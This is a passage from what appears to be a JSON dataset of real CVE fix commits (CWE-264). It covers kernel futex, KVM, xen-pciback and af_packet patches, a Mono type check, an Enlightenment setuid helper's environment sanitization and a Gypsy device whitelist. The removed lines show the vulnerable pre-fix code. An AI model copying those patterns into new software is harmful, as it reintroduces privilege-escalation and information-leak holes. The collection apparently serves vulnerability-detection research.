2fdcc9819f36..27a0222c2946 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -185,6 +185,7 @@ static void kvm_cpu_vmxoff(void);\n static DEFINE_PER_CPU(struct vmcs *, vmxarea);\n static DEFINE_PER_CPU(struct vmcs *, current_vmcs);\n static DEFINE_PER_CPU(struct list_head, vcpus_on_cpu);\n+static DEFINE_PER_CPU(struct desc_ptr, host_gdt);\n \n static unsigned long *vmx_io_bitmap_a;\n static unsigned long *vmx_io_bitmap_b;\n@@ -871,6 +872,7 @@ static void __vmx_load_host_state(struct vcpu_vmx *vmx)\n #endif\n \tif (current_thread_info()->status & TS_USEDFPU)\n \t\tclts();\n+\tload_gdt(&__get_cpu_var(host_gdt));\n }\n \n static void vmx_load_host_state(struct vcpu_vmx *vmx)\n@@ -1379,6 +1381,8 @@ static int hardware_enable(void *garbage)\n \t\tept_sync_global();\n \t}\n \n+\tstore_gdt(&__get_cpu_var(host_gdt));\n+\n \treturn 0;\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2015-2150","CWE_ID":"264","category":"security","commit_id":"af6fc858a35b90e89ea7a7ee58e66628c55c776b","commit_message":"From af6fc858a35b90e89ea7a7ee58e66628c55c776b Mon Sep 17 00:00:00 2001\nFrom: Jan Beulich <JBeulich@suse.com>\nDate: Wed, 11 Mar 2015 13:51:17 +0000\nSubject: xen-pciback: limit guest control of command register\n\nOtherwise the guest can abuse that control to cause e.g. PCIe\nUnsupported Request responses by disabling memory and\/or I\/O decoding\nand subsequently causing (CPU side) accesses to the respective address\nranges, which (depending on system configuration) may be fatal to the\nhost.\n\nNote that to alter any of the bits collected together as\nPCI_COMMAND_GUEST permissive mode is now required to be enabled\nglobally or on the specific device.\n\nThis is CVE-2015-2150 \/ XSA-120.\n\nSigned-off-by: Jan Beulich <jbeulich@suse.com>\nReviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: David Vrabel <david.vrabel@citrix.com>\n---\n drivers\/xen\/xen-pciback\/conf_space.c        |  2 +-\n drivers\/xen\/xen-pciback\/conf_space.h        |  2 +\n drivers\/xen\/xen-pciback\/conf_space_header.c | 61 +++++++++++++++++++++++------\n 3 files changed, 51 insertions(+), 14 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/xen\/xen-pciback\/conf_space.c b\/drivers\/xen\/xen-pciback\/conf_space.c\nindex 46ae0f9f02ad..75fe3d466515 100644\n--- a\/drivers\/xen\/xen-pciback\/conf_space.c\n+++ b\/drivers\/xen\/xen-pciback\/conf_space.c\n@@ -16,7 +16,7 @@\n #include \"conf_space.h\"\n #include \"conf_space_quirks.h\"\n \n-static bool permissive;\n+bool permissive;\n module_param(permissive, bool, 0644);\n \n \/* This is where xen_pcibk_read_config_byte, xen_pcibk_read_config_word,\ndiff --git a\/drivers\/xen\/xen-pciback\/conf_space.h b\/drivers\/xen\/xen-pciback\/conf_space.h\nindex e56c934ad137..2e1d73d1d5d0 100644\n--- a\/drivers\/xen\/xen-pciback\/conf_space.h\n+++ b\/drivers\/xen\/xen-pciback\/conf_space.h\n@@ -64,6 +64,8 @@ struct config_field_entry {\n \tvoid *data;\n };\n \n+extern bool permissive;\n+\n #define OFFSET(cfg_entry) ((cfg_entry)->base_offset+(cfg_entry)->field->offset)\n \n \/* Add fields to a device - the add_fields macro expects to get a pointer to\ndiff --git a\/drivers\/xen\/xen-pciback\/conf_space_header.c b\/drivers\/xen\/xen-pciback\/conf_space_header.c\nindex c5ee82587e8c..2d7369391472 100644\n--- a\/drivers\/xen\/xen-pciback\/conf_space_header.c\n+++ b\/drivers\/xen\/xen-pciback\/conf_space_header.c\n@@ -11,6 +11,10 @@\n #include \"pciback.h\"\n #include \"conf_space.h\"\n \n+struct pci_cmd_info {\n+\tu16 val;\n+};\n+\n struct pci_bar_info {\n \tu32 val;\n \tu32 len_val;\n@@ -20,22 +24,36 @@ struct pci_bar_info {\n #define is_enable_cmd(value) ((value)&(PCI_COMMAND_MEMORY|PCI_COMMAND_IO))\n #define is_master_cmd(value) ((value)&PCI_COMMAND_MASTER)\n \n-static int command_read(struct pci_dev *dev, int offset, u16 *value, void *data)\n+\/* Bits guests are allowed to control in permissive mode. *\/\n+#define PCI_COMMAND_GUEST (PCI_COMMAND_MASTER|PCI_COMMAND_SPECIAL| \\\n+\t\t\t   PCI_COMMAND_INVALIDATE|PCI_COMMAND_VGA_PALETTE| \\\n+\t\t\t   PCI_COMMAND_WAIT|PCI_COMMAND_FAST_BACK)\n+\n+static void *command_init(struct pci_dev *dev, int offset)\n {\n-\tint i;\n-\tint ret;\n-\n-\tret = xen_pcibk_read_config_word(dev, offset, value, data);\n-\tif (!pci_is_enabled(dev))\n-\t\treturn ret;\n-\n-\tfor (i = 0; i < PCI_ROM_RESOURCE; i++) {\n-\t\tif (dev->resource[i].flags & IORESOURCE_IO)\n-\t\t\t*value |= PCI_COMMAND_IO;\n-\t\tif (dev->resource[i].flags & IORESOURCE_MEM)\n-\t\t\t*value |= PCI_COMMAND_MEMORY;\n+\tstruct pci_cmd_info *cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);\n+\tint err;\n+\n+\tif (!cmd)\n+\t\treturn ERR_PTR(-ENOMEM);\n+\n+\terr = pci_read_config_word(dev, PCI_COMMAND, &cmd->val);\n+\tif (err) {\n+\t\tkfree(cmd);\n+\t\treturn ERR_PTR(err);\n \t}\n \n+\treturn cmd;\n+}\n+\n+static int command_read(struct pci_dev *dev, int offset, u16 *value, void *data)\n+{\n+\tint ret = pci_read_config_word(dev, offset, value);\n+\tconst struct pci_cmd_info *cmd = data;\n+\n+\t*value &= PCI_COMMAND_GUEST;\n+\t*value |= cmd->val & ~PCI_COMMAND_GUEST;\n+\n \treturn ret;\n }\n \n@@ -43,6 +61,8 @@ static int command_write(struct pci_dev *dev, int offset, u16 value, void *data)\n {\n \tstruct xen_pcibk_dev_data *dev_data;\n \tint err;\n+\tu16 val;\n+\tstruct pci_cmd_info *cmd = data;\n \n \tdev_data = pci_get_drvdata(dev);\n \tif (!pci_is_enabled(dev) && is_enable_cmd(value)) {\n@@ -83,6 +103,19 @@ static int command_write(struct pci_dev *dev, int offset, u16 value, void *data)\n \t\t}\n \t}\n \n+\tcmd->val = value;\n+\n+\tif (!permissive && (!dev_data || !dev_data->permissive))\n+\t\treturn 0;\n+\n+\t\/* Only allow the guest to control certain bits. *\/\n+\terr = pci_read_config_word(dev, offset, &val);\n+\tif (err || val == value)\n+\t\treturn err;\n+\n+\tvalue &= PCI_COMMAND_GUEST;\n+\tvalue |= val & ~PCI_COMMAND_GUEST;\n+\n \treturn pci_write_config_word(dev, offset, value);\n }\n \n@@ -282,6 +315,8 @@ static const struct config_field header_common[] = {\n \t{\n \t .offset    = PCI_COMMAND,\n \t .size      = 2,\n+\t .init      = command_init,\n+\t .release   = bar_release,\n \t .u.w.read  = command_read,\n \t .u.w.write = command_write,\n \t},\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3153","CWE_ID":"264","category":"security","commit_id":"b3eaa9fc5cd0a4d74b18f6b8dc617aeaf1873270","commit_message":"From b3eaa9fc5cd0a4d74b18f6b8dc617aeaf1873270 Mon Sep 17 00:00:00 2001\nFrom: Thomas Gleixner <tglx@linutronix.de>\nDate: Tue, 3 Jun 2014 12:27:06 +0000\nSubject: futex: Validate atomic acquisition in futex_lock_pi_atomic()\n\nWe need to protect the atomic acquisition in the kernel against rogue\nuser space which sets the user space futex to 0, so the kernel side\nacquisition succeeds while there is existing state in the kernel\nassociated to the real owner.\n\nVerify whether the futex has waiters associated with kernel state.  If\nit has, return -EINVAL.  The state is corrupted already, so no point in\ncleaning it up.  Subsequent calls will fail as well.  Not our problem.\n\n[ tglx: Use futex_top_waiter() and explain why we do not need to try\n  \trestoring the already corrupted user space state. ]\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com>\nCc: Kees Cook <keescook@chromium.org>\nCc: Will Drewry <wad@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/futex.c | 14 +++++++++++---\n 1 file changed, 11 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/futex.c b\/kernel\/futex.c\nindex 663ea2b84a38..520e7b23bf3c 100644\n--- a\/kernel\/futex.c\n+++ b\/kernel\/futex.c\n@@ -910,10 +910,18 @@ retry:\n \t\treturn -EDEADLK;\n \n \t\/*\n-\t * Surprise - we got the lock. Just return to userspace:\n+\t * Surprise - we got the lock, but we do not trust user space at all.\n \t *\/\n-\tif (unlikely(!curval))\n-\t\treturn 1;\n+\tif (unlikely(!curval)) {\n+\t\t\/*\n+\t\t * We verify whether there is kernel state for this\n+\t\t * futex. If not, we can safely assume, that the 0 ->\n+\t\t * TID transition is correct. If state exists, we do\n+\t\t * not bother to fixup the user space state as it was\n+\t\t * corrupted already.\n+\t\t *\/\n+\t\treturn futex_top_waiter(hb, key) ? -EINVAL : 1;\n+\t}\n \n \tuval = curval;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-0989","CWE_ID":"264","category":"security","commit_id":"035c8587c0d8d307e45f1b7171a0d337bb451f1e","commit_message":"From 035c8587c0d8d307e45f1b7171a0d337bb451f1e Mon Sep 17 00:00:00 2001\nFrom: Zoltan Varga <vargaz@gmail.com>\nDate: Tue, 18 Jan 2011 16:41:37 +0100\nSubject: [PATCH] Allow only primitive types\/enums in\n RuntimeHelpers.InitializeArray ().\n\n---\n mono\/metadata\/icall.c | 7 ++-----\n 1 file changed, 2 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/mono\/metadata\/icall.c b\/mono\/metadata\/icall.c\nindex ec2daf574447..b75791231e2a 100644\n--- a\/mono\/metadata\/icall.c\n+++ b\/mono\/metadata\/icall.c\n@@ -854,12 +854,9 @@ ves_icall_System_Runtime_CompilerServices_RuntimeHelpers_InitializeArray (MonoAr\n \tint align;\n \tconst char *field_data;\n \n-\tif (MONO_TYPE_IS_REFERENCE (type) ||\n-\t\t\t(type->type == MONO_TYPE_VALUETYPE &&\n-\t\t\t\t(!mono_type_get_class (type) ||\n-\t\t\t\tmono_type_get_class (type)->has_references))) {\n+\tif (MONO_TYPE_IS_REFERENCE (type) || type->type == MONO_TYPE_VALUETYPE) {\n \t\tMonoException *exc = mono_get_exception_argument(\"array\",\n-\t\t\t\"Cannot initialize array containing references\");\n+\t\t\t\"Cannot initialize array of non-primitive type.\");\n \t\tmono_raise_exception (exc);\n \t}\n \n","owner":"mono","repo":"mono","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"564b3bffc619dcbdd160de597b0547a7017ea010","commit_message":"From 564b3bffc619dcbdd160de597b0547a7017ea010 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 17:00:51 -0500\nSubject: arch_mmap_check() on mn10300\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/mn10300\/include\/asm\/mman.h   | 5 +++++\n arch\/mn10300\/kernel\/sys_mn10300.c | 5 -----\n 2 files changed, 5 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/arch\/mn10300\/include\/asm\/mman.h b\/arch\/mn10300\/include\/asm\/mman.h\nindex 8eebf89f5ab1..db5c53da73ce 100644\n--- a\/arch\/mn10300\/include\/asm\/mman.h\n+++ b\/arch\/mn10300\/include\/asm\/mman.h\n@@ -1 +1,6 @@\n #include <asm-generic\/mman.h>\n+\n+#define MIN_MAP_ADDR\tPAGE_SIZE\t\/* minimum fixed mmap address *\/\n+\n+#define arch_mmap_check(addr, len, flags) \\\n+\t(((flags) & MAP_FIXED && (addr) < MIN_MAP_ADDR) ? -EINVAL : 0)\ndiff --git a\/arch\/mn10300\/kernel\/sys_mn10300.c b\/arch\/mn10300\/kernel\/sys_mn10300.c\nindex 8ca5af00334c..ec4100dfcb7d 100644\n--- a\/arch\/mn10300\/kernel\/sys_mn10300.c\n+++ b\/arch\/mn10300\/kernel\/sys_mn10300.c\n@@ -23,8 +23,6 @@\n \n #include <asm\/uaccess.h>\n \n-#define MIN_MAP_ADDR\tPAGE_SIZE\t\/* minimum fixed mmap address *\/\n-\n \/*\n  * memory mapping syscall\n  *\/\n@@ -37,9 +35,6 @@ asmlinkage long sys_mmap2(unsigned long addr, unsigned long len,\n \n \tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n \n-\tif (flags & MAP_FIXED && addr < MIN_MAP_ADDR)\n-\t\tgoto out;\n-\n \terror = -EBADF;\n \tif (!(flags & MAP_ANONYMOUS)) {\n \t\tfile = fget(fd);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3153","CWE_ID":"264","category":"security","commit_id":"13fbca4c6ecd96ec1a1cfa2e4f2ce191fe928a5e","commit_message":"From 13fbca4c6ecd96ec1a1cfa2e4f2ce191fe928a5e Mon Sep 17 00:00:00 2001\nFrom: Thomas Gleixner <tglx@linutronix.de>\nDate: Tue, 3 Jun 2014 12:27:07 +0000\nSubject: futex: Always cleanup owner tid in unlock_pi\n\nIf the owner died bit is set at futex_unlock_pi, we currently do not\ncleanup the user space futex.  So the owner TID of the current owner\n(the unlocker) persists.  That's observable inconsistant state,\nespecially when the ownership of the pi state got transferred.\n\nClean it up unconditionally.\n\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: Kees Cook <keescook@chromium.org>\nCc: Will Drewry <wad@chromium.org>\nCc: Darren Hart <dvhart@linux.intel.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/futex.c | 40 ++++++++++++++++++----------------------\n 1 file changed, 18 insertions(+), 22 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/futex.c b\/kernel\/futex.c\nindex 520e7b23bf3c..e1cb1baa23fb 100644\n--- a\/kernel\/futex.c\n+++ b\/kernel\/futex.c\n@@ -1052,6 +1052,7 @@ static int wake_futex_pi(u32 __user *uaddr, u32 uval, struct futex_q *this)\n \tstruct task_struct *new_owner;\n \tstruct futex_pi_state *pi_state = this->pi_state;\n \tu32 uninitialized_var(curval), newval;\n+\tint ret = 0;\n \n \tif (!pi_state)\n \t\treturn -EINVAL;\n@@ -1075,23 +1076,19 @@ static int wake_futex_pi(u32 __user *uaddr, u32 uval, struct futex_q *this)\n \t\tnew_owner = this->task;\n \n \t\/*\n-\t * We pass it to the next owner. (The WAITERS bit is always\n-\t * kept enabled while there is PI state around. We must also\n-\t * preserve the owner died bit.)\n+\t * We pass it to the next owner. The WAITERS bit is always\n+\t * kept enabled while there is PI state around. We cleanup the\n+\t * owner died bit, because we are the owner.\n \t *\/\n-\tif (!(uval & FUTEX_OWNER_DIED)) {\n-\t\tint ret = 0;\n-\n-\t\tnewval = FUTEX_WAITERS | task_pid_vnr(new_owner);\n+\tnewval = FUTEX_WAITERS | task_pid_vnr(new_owner);\n \n-\t\tif (cmpxchg_futex_value_locked(&curval, uaddr, uval, newval))\n-\t\t\tret = -EFAULT;\n-\t\telse if (curval != uval)\n-\t\t\tret = -EINVAL;\n-\t\tif (ret) {\n-\t\t\traw_spin_unlock(&pi_state->pi_mutex.wait_lock);\n-\t\t\treturn ret;\n-\t\t}\n+\tif (cmpxchg_futex_value_locked(&curval, uaddr, uval, newval))\n+\t\tret = -EFAULT;\n+\telse if (curval != uval)\n+\t\tret = -EINVAL;\n+\tif (ret) {\n+\t\traw_spin_unlock(&pi_state->pi_mutex.wait_lock);\n+\t\treturn ret;\n \t}\n \n \traw_spin_lock_irq(&pi_state->owner->pi_lock);\n@@ -2351,9 +2348,10 @@ retry:\n \t\/*\n \t * To avoid races, try to do the TID -> 0 atomic transition\n \t * again. If it succeeds then we can return without waking\n-\t * anyone else up:\n+\t * anyone else up. We only try this if neither the waiters nor\n+\t * the owner died bit are set.\n \t *\/\n-\tif (!(uval & FUTEX_OWNER_DIED) &&\n+\tif (!(uval & ~FUTEX_TID_MASK) &&\n \t    cmpxchg_futex_value_locked(&uval, uaddr, vpid, 0))\n \t\tgoto pi_faulted;\n \t\/*\n@@ -2383,11 +2381,9 @@ retry:\n \t\/*\n \t * No waiters - kernel unlocks the futex:\n \t *\/\n-\tif (!(uval & FUTEX_OWNER_DIED)) {\n-\t\tret = unlock_futex_pi(uaddr, uval);\n-\t\tif (ret == -EFAULT)\n-\t\t\tgoto pi_faulted;\n-\t}\n+\tret = unlock_futex_pi(uaddr, uval);\n+\tif (ret == -EFAULT)\n+\t\tgoto pi_faulted;\n \n out_unlock:\n \tspin_unlock(&hb->lock);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-2898","CWE_ID":"264","category":"security","commit_id":"13fcb7bd322164c67926ffe272846d4860196dc6","commit_message":"From 13fcb7bd322164c67926ffe272846d4860196dc6 Mon Sep 17 00:00:00 2001\nFrom: Eric Dumazet <eric.dumazet@gmail.com>\nDate: Mon, 6 Jun 2011 22:42:06 -0700\nSubject: af_packet: prevent information leak\n\nIn 2.6.27, commit 393e52e33c6c2 (packet: deliver VLAN TCI to userspace)\nadded a small information leak.\n\nAdd padding field and make sure its zeroed before copy to user.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCC: Patrick McHardy <kaber@trash.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/linux\/if_packet.h | 2 ++\n net\/packet\/af_packet.c    | 2 ++\n 2 files changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/include\/linux\/if_packet.h b\/include\/linux\/if_packet.h\nindex 6d66ce1791a9..7b318630139f 100644\n--- a\/include\/linux\/if_packet.h\n+++ b\/include\/linux\/if_packet.h\n@@ -62,6 +62,7 @@ struct tpacket_auxdata {\n \t__u16\t\ttp_mac;\n \t__u16\t\ttp_net;\n \t__u16\t\ttp_vlan_tci;\n+\t__u16\t\ttp_padding;\n };\n \n \/* Rx ring - header status *\/\n@@ -101,6 +102,7 @@ struct tpacket2_hdr {\n \t__u32\t\ttp_sec;\n \t__u32\t\ttp_nsec;\n \t__u16\t\ttp_vlan_tci;\n+\t__u16\t\ttp_padding;\n };\n \n #define TPACKET2_HDRLEN\t\t(TPACKET_ALIGN(sizeof(struct tpacket2_hdr)) + sizeof(struct sockaddr_ll))\ndiff --git a\/net\/packet\/af_packet.c b\/net\/packet\/af_packet.c\nindex ba248d93399a..c0c3cda19712 100644\n--- a\/net\/packet\/af_packet.c\n+++ b\/net\/packet\/af_packet.c\n@@ -804,6 +804,7 @@ static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,\n \t\t} else {\n \t\t\th.h2->tp_vlan_tci = 0;\n \t\t}\n+\t\th.h2->tp_padding = 0;\n \t\thdrlen = sizeof(*h.h2);\n \t\tbreak;\n \tdefault:\n@@ -1736,6 +1737,7 @@ static int packet_recvmsg(struct kiocb *iocb, struct socket *sock,\n \t\t} else {\n \t\t\taux.tp_vlan_tci = 0;\n \t\t}\n+\t\taux.tp_padding = 0;\n \t\tput_cmsg(msg, SOL_PACKET, PACKET_AUXDATA, sizeof(aux), &aux);\n \t}\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-1845","CWE_ID":"264","category":"security","commit_id":"bb4a21e98656fe2c7d98ba2163e6defe9a630e2b","commit_message":"From bb4a21e98656fe2c7d98ba2163e6defe9a630e2b Mon Sep 17 00:00:00 2001\nFrom: \"Carsten Haitzler (Rasterman)\" <raster@rasterman.com>\nDate: Sat, 30 Nov 2013 22:26:30 +0900\nSubject: e_sys - address security concerns with environment and gdb\n\n1. clear out environment as best is possible before executing\nanything. especially PATH and IFS are set to minimal base defaults.\nalso use clearenv() if available and unsetenv()\n\n2. remove gdb method as it's just too dangerous. run it as normal as\nthe user and if the kernel \/ distro dny that - then sorry. too bad.\n---\n configure.ac                |  2 ++\n data\/etc\/sysactions.conf.in | 15 ++++++-----\n src\/bin\/e_start_main.c      |  3 +--\n src\/bin\/e_sys_main.c        | 61 ++++++++++++++++++---------------------------\n 4 files changed, 34 insertions(+), 47 deletions(-)\n\n","diff_code":"diff --git a\/configure.ac b\/configure.ac\nindex 859090e10..420fcc099 100644\n--- a\/configure.ac\n+++ b\/configure.ac\n@@ -73,6 +73,8 @@ EFL_CHECK_PATH_MAX\n \n AC_CHECK_FUNCS(setenv)\n AC_CHECK_FUNCS(unsetenv)\n+AC_CHECK_FUNCS(clearenv)\n+AC_CHECK_HEADERS([features.h])\n \n efl_version=\"1.8.0\"\n AC_SUBST(efl_version)\ndiff --git a\/data\/etc\/sysactions.conf.in b\/data\/etc\/sysactions.conf.in\nindex eccb4af56..19520ff2c 100644\n--- a\/data\/etc\/sysactions.conf.in\n+++ b\/data\/etc\/sysactions.conf.in\n@@ -43,15 +43,14 @@\n # user and group name can use glob matches (* == all for example) like the\n # shell. as can action names allowed or denied. \n \n-action:   halt      @HALT@\n-action:   reboot    @REBOOT@\n-action:   suspend   @SUSPEND@\n-action:   hibernate @HIBERNATE@\n-action:   \/bin\/mount \/bin\/mount\n-action:   \/bin\/umount \/bin\/umount\n+action:   halt           @HALT@\n+action:   reboot         @REBOOT@\n+action:   suspend        @SUSPEND@\n+action:   hibernate      @HIBERNATE@\n+action:   \/bin\/mount     \/bin\/mount\n+action:   \/bin\/umount    \/bin\/umount\n action:   \/usr\/bin\/eject \/usr\/bin\/eject\n-action:   gdb       gdb\n-action:   l2ping    l2ping\n+action:   l2ping         \/usr\/bin\/l2ping\n \n # on FreeBSD use this instead of the above.\n #action suspend  \/usr\/sbin\/zzz \ndiff --git a\/src\/bin\/e_start_main.c b\/src\/bin\/e_start_main.c\nindex 26291556a..64aa5d4c7 100644\n--- a\/src\/bin\/e_start_main.c\n+++ b\/src\/bin\/e_start_main.c\n@@ -567,8 +567,7 @@ main(int argc, char **argv)\n                               {\n                                  \/* call e_sys gdb *\/\n                                  snprintf(buffer, 4096,\n-                                          \"%s\/enlightenment\/utils\/enlightenment_sys gdb %i %s\/.e-crashdump.txt\",\n-                                          eina_prefix_lib_get(pfx),\n+                                          \"gdb %i %s\/.e-crashdump.txt\",\n                                           child,\n                                           home);\n                                  r = system(buffer);\ndiff --git a\/src\/bin\/e_sys_main.c b\/src\/bin\/e_sys_main.c\nindex baf018bf8..e833dac8e 100644\n--- a\/src\/bin\/e_sys_main.c\n+++ b\/src\/bin\/e_sys_main.c\n@@ -1,5 +1,11 @@\n #include \"config.h\"\n \n+#define __USE_MISC\n+#define _SVID_SOURCE\n+#ifdef HAVE_FEATURES_H\n+# include <features.h>\n+#endif\n+\n #include <stdio.h>\n #include <stdlib.h>\n #include <unistd.h>\n@@ -53,7 +59,6 @@ main(int argc,\n    const char *act;\n #endif\n    gid_t gid, gl[65536], egid;\n-   int pid = 0;\n \n    for (i = 1; i < argc; i++)\n      {\n@@ -75,21 +80,6 @@ main(int argc,\n              test = 1;\n              action = argv[2];\n           }\n-        else if (!strcmp(argv[1], \"gdb\"))\n-          {\n-             if (argc != 4) exit(1);\n-             char *end = NULL;\n-\n-             action = argv[1];\n-             pid = strtoul(argv[2], &end, 10);\n-             if (end == NULL || *end != '\\0')\n-               {\n-                  printf(\"Invalid pid for '%s'.\\n\", argv[3]);\n-                  exit(0);\n-               }\n-\n-             output = argv[3];\n-          }\n \telse if (!strcmp(argv[1], \"l2ping\"))\n \t  {\n \t     action = argv[1];\n@@ -161,27 +151,7 @@ main(int argc,\n         exit(20);\n      }\n \n-   if (!strcmp(action, \"gdb\"))\n-     {\n-        char buffer[4096];\n-        int r;\n-\n-        snprintf(buffer, 4096,\n-                 \"%s --pid=%i \"\n-                 \"-batch \"\n-                 \"-ex 'set logging file %s' \"\n-                 \"-ex 'set logging on' \"\n-                 \"-ex 'thread apply all backtrace full' \"\n-                 \"-ex detach > \/dev\/null 2>&1 < \/dev\/zero\",\n-                 cmd,\n-                 pid,\n-                 output ?: \"e-output.txt\");\n-\n-        r = system(buffer);\n-\n-        exit(WEXITSTATUS(r));\n-     }\n-   else if (!test && !strcmp(action, \"l2ping\"))\n+   if (!test && !strcmp(action, \"l2ping\"))\n      {\n         char tmp[128];\n \tdouble latency;\n@@ -193,6 +163,23 @@ main(int argc,\n \n \treturn (latency < 0) ? 1 : 0;\n      }\n+   \/* sanitize environment *\/\n+#ifdef HAVE_UNSETENV\n+# define NOENV(x) unsetenv(x)\n+#else\n+# define NOENV(x)\n+#endif\n+   NOENV(\"IFS\");\n+   NOENV(\"LD_PRELOAD\");\n+   NOENV(\"PYTHONPATH\");\n+   NOENV(\"LD_LIBRARY_PATH\");\n+#ifdef HAVE_CLEARENV\n+     clearenv();\n+#endif\n+   \/* set path and ifs to minimal defaults *\/\n+   putenv(\"PATH=\/bin:\/usr\/bin\");\n+   putenv(\"IFS= \\t\\n\");\n+\n    if ((!test)\n #ifdef HAVE_EEZE_MOUNT\n        && (!mnt)\n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-0523","CWE_ID":"264","category":"security","commit_id":"40101707cddb319481133b2a137294b6b669bd16","commit_message":"From 40101707cddb319481133b2a137294b6b669bd16 Mon Sep 17 00:00:00 2001\nFrom: iain <iain@sleepfive.com>\nDate: Mon, 14 May 2012 15:29:11 +0100\nSubject: Add a whitelist for what files Gypsy is allowed to open.\n\nFixes part of 33431\n---\n Makefile.am        |  2 +-\n configure.ac       |  3 +++\n src\/gypsy-server.c | 69 ++++++++++++++++++++++++++++++++++++++++++++++++++++++\n src\/gypsy-server.h |  1 +\n 4 files changed, 74 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/Makefile.am b\/Makefile.am\nindex 643b1a8..2b0b425 100644\n--- a\/Makefile.am\n+++ b\/Makefile.am\n@@ -1,4 +1,4 @@\n-SUBDIRS = interfaces src gypsy examples docs\n+SUBDIRS = interfaces src gypsy examples docs etc\n ACLOCAL_AMFLAGS = -I m4\n \n pkgconfigdir = $(libdir)\/pkgconfig\ndiff --git a\/configure.ac b\/configure.ac\nindex 3ecd500..6db6ee9 100644\n--- a\/configure.ac\n+++ b\/configure.ac\n@@ -45,6 +45,8 @@ DBUS_SYS_DIR=\"${sysconfdir}\/dbus-1\/system.d\"\n AC_SUBST(DBUS_SYS_DIR)\n AC_DEFINE_UNQUOTED(DBUS_SYS_DIR, \"$DBUS_SYS_DIR\", [Where the system dir for D-Bus is])\n \n+AC_DEFINE_UNQUOTED(CONFIG_FILE_PATH, \"${sysconfdir}\/gypsy.conf\", [The absolute path of the config file])\n+\n DBUS_SERVICES_DIR=\"${datadir}\/dbus-1\/system-services\"\n AC_SUBST(DBUS_SERVICES_DIR)\n AC_DEFINE_UNQUOTED(DBUS_SERVICES_DIR, \"$DBUS_SERVICES_DIR\", [Where services dir for D-Bus is])\n@@ -74,6 +76,7 @@ docs\/Makefile\n docs\/reference\/Makefile\n docs\/reference\/version.xml\n docs\/tools\/Makefile\n+etc\/Makefile\n gypsy.pc\n ])\n \ndiff --git a\/src\/gypsy-server.c b\/src\/gypsy-server.c\nindex f82a527..7bd7dc7 100644\n--- a\/src\/gypsy-server.c\n+++ b\/src\/gypsy-server.c\n@@ -28,12 +28,17 @@\n \/*\n  * GypsyServer - The main control object that creates GPS connection objects.\n  *\/\n+#include \"config.h\"\n #include <glib.h>\n \n #include <dbus\/dbus-glib.h>\n #include <dbus\/dbus-glib-bindings.h>\n #include <dbus\/dbus-glib-lowlevel.h>\n \n+#ifdef HAVE_BLUEZ\n+#include <bluetooth\/bluetooth.h>\n+#endif\n+\n #include \"gypsy-server.h\"\n #include \"gypsy-debug.h\"\n #include \"gypsy-client.h\"\n@@ -51,6 +56,9 @@ typedef struct _GypsyServerPrivate {\n \tint client_count; \/* When client_count returns to 0, \n \t\t\t     we quit the daemon after TERMINATE_TIMEOUT *\/\n \tguint32 terminate_id;\n+\n+\tgchar **allowed_device_globs;\n+\tgsize allowed_device_glob_count;\n } GypsyServerPrivate;\n \n static guint32 signals[LAST_SIGNAL] = {0, };\n@@ -62,6 +70,9 @@ G_DEFINE_TYPE (GypsyServer, gypsy_server, G_TYPE_OBJECT);\n #define GYPSY_GPS_PATH \"\/org\/freedesktop\/Gypsy\/\"\n #define TERMINATE_TIMEOUT 10000 \/* 10 second timeout *\/\n \n+#define GYPSY_CONF_GROUP \"gypsy\"\n+#define GYPSY_CONF_GLOB_KEY \"AllowedDeviceGlobs\"\n+\n static void gypsy_server_create (GypsyServer            *gps,\n \t\t\t\t const char             *IN_device_path,\n \t\t\t\t DBusGMethodInvocation *context);\n@@ -104,6 +115,8 @@ gypsy_server_create (GypsyServer           *gps,\n \tGypsyClient *client;\n \tchar *path, *device_name, *sender;\n \tGList *list;\n+\tint i;\n+\tgboolean allowed;\n \n \tpriv = GET_PRIVATE (gps);\n \n@@ -115,6 +128,40 @@ gypsy_server_create (GypsyServer           *gps,\n \t}\n \n \tGYPSY_NOTE (SERVER, \"Creating client for %s\", IN_device_path);\n+\n+\t\/* compare priv->device_path to allowed globs\n+\t * if not allowed, error out *\/\n+\tallowed = FALSE;\n+\tfor (i = 